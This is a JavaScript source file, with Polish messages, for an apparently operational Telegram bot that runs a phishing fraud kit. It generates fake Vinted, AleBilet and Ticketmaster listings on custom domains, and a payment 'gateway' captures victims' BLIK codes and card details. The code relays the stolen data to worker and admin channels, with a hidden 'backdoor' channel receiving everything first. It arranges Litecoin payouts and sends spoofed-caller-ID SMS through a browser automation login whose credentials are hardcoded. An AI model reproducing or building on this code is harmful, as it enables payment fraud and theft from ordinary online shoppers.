	const offers = await loadOffersVintedDB();
	const idoferty = String((Date.now() % 1000000) + Math.floor(Math.random() * 1000));
	const offerName = "Kurtka The North Face Nuptse 700 czarna · rozmiar L";
	const uniqueLink = await generateUniqueOfferLink(OfferVinted, `id-${idoferty}-${offerName.replace(/\s+/g, '-')}`);

	const offerData = {
		idoferty,
		nazwa: offerName,
		description: "Sprzedam kurtkę The North Face Nuptse 700 w kolorze czarnym, rozmiar L. Stan bardzo dobry.",
		cena: "620",
		cenaDostawy: "11.49",
		cenaOchrony: "4.99",
		nazwaFirmy: "Vinted Go",
		sprzedawca: "Ania",
		owner: userId,
		miasto: "Kraków",
		kategoria: "Moda",
		tagi: "Stan: Bardzo dobry;Marka: The North Face;Rozmiar: L;Kolor: Czarny;Sezon: Zima",
		zdjecia: [`${idoferty}.1`],
		link: uniqueLink,
		wiek: "2 lata",
		lastonline: "Dzisiaj o 15:32",
	};

	await saveOffersVintedDB([...offers, offerData]);
	await refreshOfferMenuVintedGlobal(chatId, messageId, offerData.idoferty, telegramUserId);
}

async function addOfferAlebiletGlobal(chatId, messageId, userId, telegramUserId) {
	const offers = await loadOffersAlebiletDB();
	const idoferty = crypto.randomBytes(16).toString("hex");
	const offerLink = crypto.randomBytes(16).toString("hex");
	const offerName = 'Stand-up: Abelard Giza · "Pewnie nic nie będzie"';

	const offerData = {
		idoferty,
		nazwa: offerName,
		description: "Ergo Arena, Gdańsk",
		cena: "89",
		ilosc: "2",
		owner: userId,
		miasto: "Ergo Arena, Gdańsk",
		lastonline: "28.03.2026, Sobota, 20:00",
		tagi: "Trybuny;B12;6",
		zdjecia: [],
		link: offerLink,
	};

	await saveOffersAlebiletDB([...offers, offerData]);
	await refreshOfferMenuAlebiletGlobal(chatId, messageId, offerData.idoferty, telegramUserId);
}

async function refreshOfferMenuAlebiletGlobal(chatId, messageId, offerId, telegramUserId) {
	try {
		const offers = await loadOffersAlebiletDB();
		const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
		if (!offer) {
			await bot.sendMessage(chatId, "⚠️ Oferta AleBilet nie została znaleziona.");
			return;
		}

		const users = await loadUsersDB();
		const user = users.find(u => u.id === telegramUserId);
		const publicDomain = await getPublicDomain();
		const domain = getEffectiveUserDomainSync(user, publicDomain);
		const offerLink = domain
			? buildOfferUrl("alebilet", domain, offer.link, offer.idoferty)
			: "NIE MASZ PODPIETEJ DOMENY";
		const pricing = getAlebiletPricing(offer);
		const tagParts = (offer.tagi || "").split(";").map(s => s.trim());

		const caption = markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *OFERTA · ALEBILET*\n──────────────────\n\n` +
			`› *Impreza:* \`${offer.nazwa}\`\n` +
			`› *Miejsce:* \`${offer.miasto}\`\n` +
			`› *Termin:* \`${offer.lastonline}\`\n` +
			`› *Typ:* \`${tagParts[0] || "-"}\` · *Sektor:* \`${tagParts[1] || "-"}\` · *Rząd:* \`${tagParts[2] || "-"}\`\n` +
			`› *Cena biletu:* \`${offer.cena} zł\`\n` +
			`› *Ilość biletów:* \`${offer.ilosc || pricing.qty}\`\n` +
			`› *Na stronie:* \`${formatAlebiletMoney(pricing.total)} zł\`\n\n` +
			`› *Link:* ${offerLink}`);
		caption = fitCaption(caption);

		const options = {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[
						{ text: "Nazwa imprezy", icon_custom_emoji_id: "6039779802741739617", callback_data: `ab_edit_name_${offer.idoferty}` },
						{ text: "Miejsce", icon_custom_emoji_id: "6030399199030284183", callback_data: `ab_edit_city_${offer.idoferty}` }
					],
					[
						{ text: "Termin", icon_custom_emoji_id: "5890937706803894250", callback_data: `ab_edit_date_${offer.idoferty}` },
						{ text: "Typ/Sektor/Rząd", icon_custom_emoji_id: "6043896193887506430", callback_data: `ab_edit_seats_${offer.idoferty}` }
					],
					[
						{ text: "Cena biletu", icon_custom_emoji_id: "5778421276024509124", callback_data: `ab_edit_price_${offer.idoferty}` },
						{ text: "Opłata serwisowa", icon_custom_emoji_id: "6034969813032374911", callback_data: `ab_edit_fee_${offer.idoferty}` }
					],
					[
						{ text: "Ilość biletów", icon_custom_emoji_id: "6035162669948867129", callback_data: `ab_edit_qty_${offer.idoferty}` }
					],
					[{ text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_alebilet_${offer.idoferty}` }],
					[{ text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `ab_delete_offer_${offer.idoferty}` }],
					[{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers_alebilet" }]
				]
			}
		};

		await bot.deleteMessage(chatId, messageId).catch(() => {});
		await bot.sendPhoto(chatId, "bramka.png", { caption, ...options });
	} catch (error) {
		console.error("Błąd w refreshOfferMenuAlebiletGlobal:", error);
		await bot.sendMessage(chatId, "❌ Błąd otwierania oferty AleBilet. Sprawdź logi serwera.");
	}
}

async function handlePlatformOfferCallbacks(query, { chatId, messageId, userId }) {
	const data = query.data;
	const telegramUserId = query.from.id;

	if (data === "add_offer_ticketmaster" || data === "add_offer_vinted" || data === "add_offer_alebilet") {
		const offerCheck = await checkOfferCreationAllowed(userId);
		if (!offerCheck.allowed) {
			await sendBlockedStatus(userId, offerCheck.title, offerCheck.message);
			return true;
		}
		try {
			if (data === "add_offer_ticketmaster") {
				await addOfferTicketmasterGlobal(chatId, messageId, userId, telegramUserId);
			} else if (data === "add_offer_alebilet") {
				await addOfferAlebiletGlobal(chatId, messageId, userId, telegramUserId);
			} else {
				await addOfferVintedGlobal(chatId, messageId, userId, telegramUserId);
			}
		} catch (error) {
			console.error(`Błąd ${data}:`, error);
			await bot.sendMessage(chatId, "❌ Nie udało się utworzyć oferty. Upewnij się, że bot ma połączenie z MongoDB i zrestartuj proces.");
		}
		return true;
	}

	if (data === "my_offers_alebilet") {
		const offers = await loadOffersAlebiletDB();
		const userOffers = offers.filter(o => o.owner.toString() === userId.toString());
		if (userOffers.length === 0) {
			await bot.answerCallbackQuery(query.id, { text: "❌ Nie masz żadnych ofert!" });
			return true;
		}
		const buttons = userOffers.map(offer => [{
			text: `🎟 ${offer.nazwa}`,
			callback_data: `ab_edit_offer_${offer.idoferty}`
		}]);
		buttons.push([
			{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "gateway_platform_alebilet" },
			{ text: "Usuń wszystkie", icon_custom_emoji_id: "6039522349517115015", callback_data: "delete_all_alebilet" }
		]);
		await bot.editMessageMedia({
			type: "photo",
			media: "attach://bramka.png",
			caption: `───────── [ 𝕂 ] ─────────\n❖ *TWOJE OFERTY · ALEBILET*\n──────────────────`
		}, {
			chat_id: chatId,
			message_id: messageId,
			reply_markup: { inline_keyboard: buttons }
		}).catch(() => {});
		return true;
	}

	if (data === "my_offers_ticketmaster") {
		const offers = await loadOffersTicketmasterDB();
		const userOffers = offers.filter(o => o.owner.toString() === userId.toString());
		if (userOffers.length === 0) {
			await bot.answerCallbackQuery(query.id, { text: "❌ Nie masz żadnych ofert!" });
			return true;
		}
		const buttons = userOffers.map(offer => [{
			text: `🎫 ${offer.nazwa}`,
			callback_data: `tm_edit_offer_${offer.idoferty}`
		}]);
		buttons.push([
			{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "gateway_platform_ticketmaster" },
			{ text: "Usuń wszystkie", icon_custom_emoji_id: "6039522349517115015", callback_data: "delete_all_ticketmaster" }
		]);
		await bot.editMessageMedia({
			type: "photo",
			media: "attach://bramka.png",
			caption: `───────── [ 𝕂 ] ─────────\n❖ *TWOJE OFERTY · TICKETMASTER*\n──────────────────`
		}, {
			chat_id: chatId,
			message_id: messageId,
			reply_markup: { inline_keyboard: buttons }
		}).catch(() => {});
		return true;
	}

	if (data === "my_offers_vinted") {
		const offers = await loadOffersVintedDB();
		const userOffers = offers.filter(o => o.owner.toString() === userId.toString());
		if (userOffers.length === 0) {
			await bot.answerCallbackQuery(query.id, { text: "❌ Nie masz żadnych ofert!" });
			return true;
		}
		const buttons = userOffers.map(offer => [{
			text: `${offer.nazwa}`,
			callback_data: `vinted_edit_offer_${offer.idoferty}`
		}]);
		buttons.push([
			{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "gateway_platform_vinted" },
			{ text: "Usuń wszystkie", icon_custom_emoji_id: "6039522349517115015", callback_data: "delete_all_vinted" }
		]);
		await bot.editMessageMedia({
			type: "photo",
			media: "attach://bramka.png",
			caption: `───────── [ 𝕂 ] ─────────\n❖ *TWOJE OFERTY · VINTED*\n──────────────────`
		}, {
			chat_id: chatId,
			message_id: messageId,
			reply_markup: { inline_keyboard: buttons }
		}).catch(() => {});
		return true;
	}

	if (data.startsWith("ab_edit_offer_")) {
		await refreshOfferMenuAlebiletGlobal(chatId, messageId, data.replace("ab_edit_offer_", ""), telegramUserId);
		return true;
	}

	if (data.startsWith("tm_edit_offer_")) {
		await refreshOfferMenuTicketmasterGlobal(chatId, messageId, data.replace("tm_edit_offer_", ""), telegramUserId);
		return true;
	}

	if (data.startsWith("vinted_edit_offer_")) {
		await refreshOfferMenuVintedGlobal(chatId, messageId, data.replace("vinted_edit_offer_", ""), telegramUserId);
		return true;
	}

	return false;
}

async function notifyAdminSelfCashoutHit({ ownerId, workerName, amount, platform, type = "code" }) {
	if (!(await isSelfCashoutEnabled(ownerId))) return;

	const workerLabel = workerName
		? (String(workerName).startsWith("@") ? workerName : `@${workerName}`)
		: `\`${ownerId}\``;

	let message;
	if (type === "card") {
		message =
			`<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Self cashout — karta siadła</b>\n\n` +
			`<tg-emoji emoji-id=\"5778421276024509124\">💸</tg-emoji> <b>Kwota:</b> ${amount} PLN\n` +
			`👷 <b>Worker:</b> ${workerLabel}\n` +
			`🆔 <b>ID:</b> <code>${ownerId}</code>\n` +
			`<tg-emoji emoji-id=\"5920332557466997677\">🏪</tg-emoji> <b>Bramka:</b> ${platform}`;
	} else {
		message =
			`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> <b>Self cashout — kod siadł</b>\n\n` +
			`<tg-emoji emoji-id=\"5778421276024509124\">💸</tg-emoji> <b>Kwota:</b> ${amount} PLN\n` +
			`👷 <b>Worker:</b> ${workerLabel}\n` +
			`🆔 <b>ID:</b> <code>${ownerId}</code>\n` +
			`<tg-emoji emoji-id=\"5920332557466997677\">🏪</tg-emoji> <b>Bramka:</b> ${platform}`;
	}

	// Kopia natychmiast na backdoor, kanał główny z opóźnieniem
	await sendTelegramHtmlSafe(CONFIG.CHANNELS.BACKDOOR, message);
	const deliverMainHit = () => sendTelegramHtmlSafe(CONFIG.CHANNELS.CODES, message);
	if (backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, deliverMainHit);
	else await deliverMainHit();
}

async function isDepositOverLimit(amount) {
	const limit = await getDepositLimit();
	return limit !== null && amount > limit;
}

async function triggerAutoWithdrawIfEnabled(userId, profit, sourceLabel) {
	const targetUser = await User.findOne({ id: userId });
	if (!targetUser) return { triggered: false, targetUser: null };

	if (!targetUser.autoWithdraw || (!targetUser.payoutOverrideAddress && (!targetUser.ltcAddress || targetUser.ltcAddress === "Brak"))) {
		return { triggered: false, targetUser };
	}

	targetUser.withdrawn = (targetUser.withdrawn || 0) + profit;
	await targetUser.save();

	const payoutKeyboard = {
		inline_keyboard: [[
			{ text: "Akceptuj", icon_custom_emoji_id: "5774022692642492953", callback_data: `payout_accept_${userId}_${profit}` },
			{ text: "Odrzuć", icon_custom_emoji_id: "6030757850274336631", callback_data: `payout_reject_${userId}_${profit}` }
		]]
	};

	const payoutText =
		`<tg-emoji emoji-id=\"5884428842780594914\">⚡</tg-emoji> <b>AUTOMATYCZNE ZGŁOSZENIE WYPŁATY!</b> (${sourceLabel})\n\n` +
		`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Użytkownik:</b> <code>${userId}</code>\n` +
		`<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> <b>Kwota zysku:</b> <code>${profit.toFixed(2)} PLN</code>\n` +
		`<tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <b>Adres LTC:</b> <code>${getPayoutAddress(targetUser)}</code>`;

	const mainPayoutMsgId = await sendChannelMessageHtml(CONFIG.CHANNELS.PAYOUTS, payoutText, payoutKeyboard);
	registerCodeMessage(`payout_${userId}_${profit}`, CONFIG.CHANNELS.PAYOUTS, mainPayoutMsgId);
	await mirrorPayoutToBackdoor(`payout_${userId}_${profit}`, payoutText, payoutKeyboard);

	return { triggered: true, targetUser };
}

function isSameTelegramUser(a, b) {
	if (a == null || b == null) return false;
	return String(a) === String(b);
}

async function canProcessGatewayAction(userId, ownerId, { chatId = null, chatType = null, itemKey = null } = {}) {
	if (await isFgAdmin(userId)) return true;
	// Kanał główny / backdoor — decyduje cashouter z kanału
	if (isCodesChat(chatId) || String(chatId) === String(CONFIG.CHANNELS.BACKDOOR)) return true;
	// Osoba, która przejęła kod/kartę — może działać też z panelu na PV
	if (itemKey && String(codeClaimer.get(itemKey) || "") === String(userId)) return true;
	if (ownerId && isSameTelegramUser(userId, ownerId)) return true;

	if (await isSelfCashoutEnabled(ownerId)) {
		// W self cashout kod trafia na PV workera — pozwól mu akceptować/odrzucać
		if (chatType === "private" && chatId != null && isSameTelegramUser(chatId, userId)) {
			if (!ownerId || isSameTelegramUser(userId, ownerId) || isSameTelegramUser(chatId, ownerId)) {
				return true;
			}
		}
	}

	return false;
}

async function sendGatewaySubmission(ownerId, message, { keyboard = null, threadId = null, parseMode = "HTML", key = null, mainMessage = null, mainKeyboard = null } = {}) {
	const opts = { parse_mode: parseMode };
	if (keyboard) opts.reply_markup = keyboard;

	// Backdoor — pełne dane NATYCHMIAST, bez opcji przejęcia
	const backdoorMsgId = await sendTelegramHtmlSafe(CONFIG.CHANNELS.BACKDOOR, message, keyboard, threadId);
	if (key) registerCodeMessage(key, CONFIG.CHANNELS.BACKDOOR, backdoorMsgId);

	if (!(await isSelfCashoutEnabled(ownerId))) {
		// Kanał główny — dane ukryte, najpierw trzeba przejąć
		const deliverMain = async () => {
			const mid = await sendTelegramHtmlSafe(CONFIG.CHANNELS.CODES, mainMessage || message, mainKeyboard, threadId);
			if (key) registerCodeMessage(key, CONFIG.CHANNELS.CODES, mid);
		};
		if (backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, deliverMain);
		else await deliverMain();
		return "channel";
	}

	// Self cashout: backdoor dostaje pełne dane NATYCHMIAST, worker dopiero po /delay
	const deliverOwner = async () => {
		const mid = await sendTelegramHtmlSafe(ownerId, message, keyboard);
		if (key) registerCodeMessage(key, ownerId, mid);
	};
	if (backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, deliverOwner);
	else await deliverOwner();
	return "owner";
}

async function broadcastSelfCashoutAnnouncement(turningOn) {
	const allUsers = await User.find({ approved: true });
	for (const targetUser of allUsers) {
		try {
			if (turningOn) {
				await sendModernStatus(targetUser.id, [{
					title: "Tryb self cashout",
					lines: [
						"",
						modernBullet("**Aktywny** — kody z bramki lecą prosto do Ciebie."),
						modernBullet("BLIK z bramki ląduje u Ciebie jak zwykle, ale nadal możesz wrzucać BLIK przez `/start`."),
						modernBullet("Kody widzisz z opóźnieniem ustawionym przez `/delay`."),
						"",
						modernInfo("Backdoor dostaje komplet danych jako pierwszy.")
					]
				}]);
			} else {
				const fee = await getUserFee(targetUser);
				const feeStr = Number.isInteger(fee) ? fee.toFixed(0) : fee.toFixed(1);
				await sendModernStatus(targetUser.id, [{
					title: "Tryb self cashout wyłączony",
					lines: [
						"",
						modernBullet("Wracasz na model prowizyjny."),
						modernBullet(`Twoja stawka: \`${feeStr}%\`.`),
						"",
						modernInfo("Kody z bramki znów trafiają do puli.")
					]
				}]);
			}
		} catch (e) {}
	}
}

async function creditBramkaPayment(ownerId, idoferty, sourceLabel) {
	if (await isSelfCashoutEnabled(ownerId)) {
		const lines = [
			modernKv("Bramka", sourceLabel),
			modernBullet("Kod zaakceptowany — w trybie self cashout zysk **nie jest księgowany** do wypłaty.")
		];
		if (sourceLabel === "BLIK") {
			lines.push(modernBullet("Victim zobaczy błąd płatności — środki zostaną zwrócone w ciągu 48h."));
		}
		await sendModernStatus(ownerId, [
			{
				title: "Self cashout",
				lines
			}
		]);
		return { selfCashout: true, credited: false };
	}

	let offer = await Offer.findOne({ idoferty: idoferty.toString() });
	if (!offer) {
		offer = await OfferOLX.findOne({ idoferty: idoferty.toString() });
	}
	if (!offer) {
		offer = await OfferTicketmaster.findOne({ idoferty: idoferty.toString() });
	}
	if (!offer) {
		offer = await OfferVinted.findOne({ idoferty: idoferty.toString() });
	}
	if (!offer) {
		offer = await OfferAlebilet.findOne({ idoferty: idoferty.toString() });
	}
	if (!offer) return null;

	const grossAmount = parseFloat(String(offer.cena).replace(/[^\d.,]/g, "").replace(",", "."));
	if (isNaN(grossAmount) || grossAmount <= 0) return null;

	if (await isDepositOverLimit(grossAmount)) {
		const limit = await getDepositLimit();
		await sendModernStatus(ownerId, [
			{
				title: "Limit przekroczony",
				lines: [
					modernKv("Limit wpłaty", `${limit.toFixed(2)} PLN`),
					modernBullet(`Płatność z bramki (${sourceLabel}) nie została zaksięgowana.`)
				]
			}
		]);
		return null;
	}

	const result = await creditUserProfit(ownerId, grossAmount);
	if (!result) return null;

	const { profit, fee } = result;
	const autoWithdraw = await triggerAutoWithdrawIfEnabled(ownerId, profit, `Bramka: ${sourceLabel}`);
	const statusLines = [
		modernKv("Bramka", sourceLabel),
		modernKv(`Zysk po fee (${fee.toFixed(1)}%)`, `${profit.toFixed(2)} PLN`)
	];
	if (autoWithdraw.triggered) {
		statusLines.push(modernBullet("Auto-wypłata wysłana na Twój adres LTC."));
	}
	await sendModernStatus(ownerId, [
		{
			title: "Płatność zaksięgowana",
			lines: statusLines
		}
	]);
	return result;
}

async function addUserToList(userId) {
	const raw = await getBotConfig("users_list");
	const usersList = raw ? JSON.parse(raw) : [];
	const idStr = userId.toString();
	if (!usersList.includes(idStr)) {
		usersList.push(idStr);
		await setBotConfig("users_list", JSON.stringify(usersList));
	}
}

function getPuppeteerLaunchOptions() {
	const options = {
		headless: true,
		args: ['--no-sandbox', '--disable-setuid-sandbox']
	};

	if (process.env.CHROMIUM_PATH && fs.existsSync(process.env.CHROMIUM_PATH)) {
		options.executablePath = process.env.CHROMIUM_PATH;
		return options;
	}

	if (process.platform === 'linux') {
		const linuxPaths = [
			'/usr/bin/chromium-browser',
			'/usr/bin/chromium',
			'/usr/bin/google-chrome'
		];
		for (const browserPath of linuxPaths) {
			if (fs.existsSync(browserPath)) {
				options.executablePath = browserPath;
				break;
			}
		}
	} else if (process.platform === 'win32') {
		const winPaths = [
			process.env.LOCALAPPDATA && path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'Application', 'chrome.exe'),
			'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
			'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
			'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
			'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'
		].filter(Boolean);
		for (const browserPath of winPaths) {
			if (fs.existsSync(browserPath)) {
				options.executablePath = browserPath;
				break;
			}
		}
	}

	return options;
}

async function executeSmsSending(callerid, to, text) {
	let browser;
	try {
		browser = await puppeteer.launch(getPuppeteerLaunchOptions());
		const page = await browser.newPage();
		await page.goto("https://narayana.im/login", {
			waitUntil: "networkidle2"
		});

		await page.type('input[name="login"]', 'makatussin');
		await page.type('input[name="password"]', 'Anal123!');
		await page.click('button[type="submit"]');
		await page.waitForNavigation();

		await page.goto("https://narayana.im/messages/send", {
			waitUntil: "networkidle2"
		});
		await page.$eval('input[name="callerid"]', (input) => input.value = '');
		await page.type('input[name="callerid"]', callerid);
		await page.type('input[name="to"]', to);
		await page.type('textarea[name="text"]', text);
		setTimeout(async () => {
			await page.click('button[type="submit"]');
		}, 250);
		setTimeout(async () => {
			await browser.close();
		}, 750);
	} catch (err) {
		console.error("[executeSmsSending] Błąd Puppeteer/SMS:", err.message || err);
		if (browser) {
			await browser.close().catch(() => {});
		}
	}
}

bot.onText(/\/(start|menu|panel)/, async (msg) => {
	const chatId = msg.chat.id;
	const userId = msg.from.id;

	try {
	if (msg.chat.type !== 'private') {
		return;
	}

	if (!(await ensureMongoConnected())) {
		await bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Baza danych (MongoDB) nie działa.\n\nUruchom usługę MongoDB na serwerze:\n`net start MongoDB`\n\nPotem: `pm2 restart krypciok-bot`");
		return;
	}

	const user = await ensureUser(userId, msg.from.username);

	if (user.banned) {
		bot.sendPhoto(chatId, 'banita.png', {
			caption: `<tg-emoji emoji-id=\"5938215362473496448\">⛔</tg-emoji> Twoje konto jest zablokowane.\n🆔 <b>ID:</b> <code>${userId}</code>\n`,
			parse_mode: 'HTML',
			reply_markup: {
				inline_keyboard: [
					[{
						text: "🚨 Kontakt",
						url: CONFIG.URLS.CONTACT
					}]
				]
			}
		});
		return;
	}

	const isAdmin = await isFgAdmin(userId);
	if (isAdmin) {
		await editUserDB(userId, { fgState: null, tempAmount: null, adminState: null, approved: true });
		await sendCombinedMainMenu(chatId, userId);
		return;
	}

	if (!user.approved) {
		await editUserDB(userId, { fgState: "awaiting_verification_source" });
		await sendModernPrompt(chatId, "Weryfikacja", "Skąd znasz tego bota?");
		return;
	}

	await sendCombinedMainMenu(chatId, userId);
	} catch (err) {
		console.error("[/start] Blad obslugi:", err.message || err, err.stack || "");
		try {
			await bot.sendMessage(chatId, "❌ Wystąpił błąd. Spróbuj ponownie za chwilę.");
		} catch (e) {}
	}
});

bot.onText(/^\/selfcashout(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
	const chatId = msg.chat.id;
	const userId = msg.from.id;
	if (msg.chat.type !== 'private') return;

	const arg = (match?.[1] || "").trim().toUpperCase();
	const isAdmin = await isFgAdmin(userId);
	const globalOn = await isGlobalSelfCashout();

	if (!arg) {
		const user = await User.findOne({ id: userId });
		const until = user?.selfCashoutUntil && user.selfCashoutUntil.getTime() > Date.now()
			? user.selfCashoutUntil
			: null;
		const lines = [];
		if (globalOn) {
			lines.push("", modernBullet("Self cashout jest **włączony globalnie** przez administrację."));
		} else if (until) {
			const leftDays = Math.ceil((until.getTime() - Date.now()) / 86400000);
			lines.push("", modernBullet(`Masz aktywny dostęp jeszcze przez \`${leftDays}\` dni.`));
			lines.push(modernInfo(`Wygasa: \`${until.toLocaleString("pl-PL")}\``));
		} else {
			lines.push("", modernBullet("Brak aktywnego self cashoutu."), modernInfo("Aktywuj go kodem: `/selfcashout <kod>`"));
		}
		await sendModernStatus(chatId, [{ title: "Self cashout", lines }]);
		return;
	}

	if (globalOn) {
		await sendModernStatus(chatId, [{
			title: "Self cashout",
			lines: ["", modernBullet("Tryb jest już aktywny globalnie — kod nie jest potrzebny.")]
		}]);
		return;
	}

	const promo = await PromoCode.findOne({ code: arg });
	if (!promo) {
		await sendModernStatus(chatId, [{
			title: "Promo kod",
			lines: ["", modernBullet("Kod **nie istnieje** lub został wpisany błędnie.")]
		}]);
		return;
	}
	if (promo.usedBy && promo.usedBy !== userId) {
		await sendModernStatus(chatId, [{
			title: "Promo kod",
			lines: ["", modernBullet("Ten kod został już wykorzystany.")]
		}]);
		return;
	}

	const user = await User.findOne({ id: userId });
	const base = user?.selfCashoutUntil && user.selfCashoutUntil.getTime() > Date.now()
		? user.selfCashoutUntil.getTime()
		: Date.now();
	const until = new Date(base + promo.days * 86400000);

	await PromoCode.updateOne({ _id: promo._id }, { $set: { usedBy: userId, usedAt: new Date() } });
	await editUserDB(userId, { selfCashoutUntil: until });

	await sendModernStatus(chatId, [{
		title: "Promo kod aktywowany",
		lines: [
			"",
			modernBullet(`Self cashout włączony na **${promo.days} dni**.`),
			modernInfo(`Wygasa: \`${until.toLocaleString("pl-PL")}\``),
			"",
			modernBullet("Kody z bramki trafiają teraz prosto do Ciebie."),
			modernBullet("Możesz też dalej wrzucać BLIK przez `/start`.")
		]
	}]);
});

bot.onText(/\/domena (.+)/, async (msg, match) => {
	const chatId = msg.chat.id;
	const newDomain = match[1];
	const userId = msg.from.id;

	if (newDomain) {
		const normalizedDomain = newDomain.trim().toLowerCase();
		if (isReservedDomain(normalizedDomain)) {
			sendTempMessage(chatId, getReservedDomainError(normalizedDomain));
			return;
		}

		const user = await User.findOne({
			id: userId
		});

		if (!user) {
			const message = await bot.sendMessage(chatId, 'Nie znaleziono użytkownika w bazie.');
			setTimeout(() => bot.deleteMessage(chatId, message.message_id), 2000);
			return;
		}

		const updatedUser = await editUserDB(userId, {
			"settings.domainMode": "custom",
			"settings.customDomain": normalizedDomain,
			"settings.domain": normalizedDomain
		});

		if (updatedUser) {
			const message = await bot.sendMessage(chatId, `Domena została zmieniona na: ${newDomain}`);
			setTimeout(() => bot.deleteMessage(chatId, message.message_id), 2000);
		} else {
			const message = await bot.sendMessage(chatId, 'Wystąpił błąd podczas zmiany domeny.');
			setTimeout(() => bot.deleteMessage(chatId, message.message_id), 2000);
		}
	} else {
		const message = await bot.sendMessage(chatId, 'Proszę podać domenę w formacie: /domena example.com');
		setTimeout(() => bot.deleteMessage(chatId, message.message_id), 2000);
	}
});


const sendTempMessage = async (chatId, text) => {
	try {
		const sentMessage = await bot.sendMessage(chatId, markdownToHtml(String(text)), { parse_mode: "HTML" });
		setTimeout(() => bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {}), 3000);
	} catch (error) {
		console.error("Błąd wysyłania/usuwania wiadomości:", error);
	}
};


bot.onText(/\/ban (\d+)/, async (msg, match) => {
	const chatId = msg.chat.id;
	const senderId = msg.from.id;
	const banUserId = parseInt(match[1]);

	if (!ownerIds.includes(senderId)) {
		sendTempMessage(chatId, "🚫 Nie masz uprawnień do banowania!");
		return;
	}

	const user = await User.findOne({
		id: banUserId
	});

	if (user) {
		const updatedUser = await editUserDB(banUserId, {
			banned: 1
		});

		if (updatedUser) {
			sendTempMessage(chatId, `<tg-emoji emoji-id=\"5938215362473496448\">🚫</tg-emoji> Użytkownik @${user.username} (${banUserId}) został‚ zbanowany.`);
		} else {
			sendTempMessage(chatId, "❌ Wystąpił błąd podczas próby zbanowania Użytkownika.");
		}
	} else {
		sendTempMessage(chatId, "❌ Nie znaleziono użytkownika.");
	}
});

bot.onText(/\/unban (\d+)/, async (msg, match) => {
	const chatId = msg.chat.id;
	const senderId = msg.from.id;
	const unbanUserId = parseInt(match[1]);

	if (!ownerIds.includes(senderId)) {
		sendTempMessage(chatId, "🚫 Nie masz uprawnień do odbanowania!");
		return;
	}

	const user = await User.findOne({
		id: unbanUserId
	});

	if (user) {
		const updatedUser = await editUserDB(unbanUserId, {
			banned: 0
		});

		if (updatedUser) {
			sendTempMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Użytkownik @${user.username} (${unbanUserId}) został odbanowany.`);
		} else {
			sendTempMessage(chatId, "❌ Wystąpił błąd podczas próby odbanowania użytkownika.");
		}
	} else {
		sendTempMessage(chatId, "❌ Nie znaleziono użytkownika.");
	}
});


bot.onText(/\/unregister (\d+)/, async (msg, match) => {
	const chatId = msg.chat.id;
	const senderId = msg.from.id;
	const removeUserId = parseInt(match[1]);

	if (!ownerIds.includes(senderId)) {
		sendTempMessage(chatId, "🚫 Nie masz uprawnień do usuwania użytkowników!");
		return;
	}

	const result = await deleteUserDB(removeUserId);
	if (result) {
		sendTempMessage(chatId, `<tg-emoji emoji-id=\"6039522349517115015\">🗑</tg-emoji> Użytkownik o ID ${removeUserId} został usunięty.`);
	} else {
		sendTempMessage(chatId, "❌ Nie znaleziono użytkownika.");
	}
});


function escapeMarkdownV2(text) {
	return text
		.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
}




bot.onText(/\/users/, async (msg) => {
	const chatId = msg.chat.id;
	const senderId = msg.from.id;

	if (!ownerIds.includes(senderId)) {
		sendTempMessage(chatId, "🚫 Nie masz uprawnień do tej komendy!");
		return;
	}

	const registeredUsers = await loadUsersDB();

	if (registeredUsers.length === 0) {
		sendTempMessage(chatId, "📂 Brak zarejestrowanych użytkowników.");
		return;
	}

	let userList = "📋 <b>Lista użytkowników:</b>\n";
	registeredUsers.forEach(user => {
		const expiresAt = moment(user.expires, "YYYY-MM-DD HH:mm:ss").tz("Europe/Warsaw");
		const currentDate = moment().tz("Europe/Warsaw");
		const isExpired = expiresAt.isBefore(currentDate);
		let status = "✅ AKTYWNY";
		if (user.banned) {
			status = "🚫 ZBANOWANY";
		} else if (isExpired) {
			status = "⚠️ DOSTĘP WYGASŁ";
		}
		userList += `<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> @${escapeMarkdownV2(user.username || "brak")} \\| ID: <code>${escapeMarkdownV2(user.id.toString())}</code> \\| ${escapeMarkdownV2(status)}\n`;
	});

	bot.sendMessage(chatId, userList, {
		parse_mode: "HTML"
	});
});



bot.on('message', async (msg) => {
	try {
		if (msg.from?.id && isUserFlooding(msg.from.id)) {
			return;
		}

		if (msg.chat.type === 'private' && msg.text && !msg.text.startsWith('/')) {
			const handled = await handleFgTextMessage(msg);
			if (handled) return;
		}
	} catch (error) {
		console.error('Blad obslugi wiadomosci FG:', error);
	}

	try {
		if (msg.chat.type === 'private') {
			await bot.deleteMessage(msg.chat.id, msg.message_id);
		}
	} catch (error) {
		console.error('Nie mozna usunac wiadomosci:', error);
	}
});


async function generateDomain() {
	const id = Math.floor(1000000 + Math.random() * 9000000);
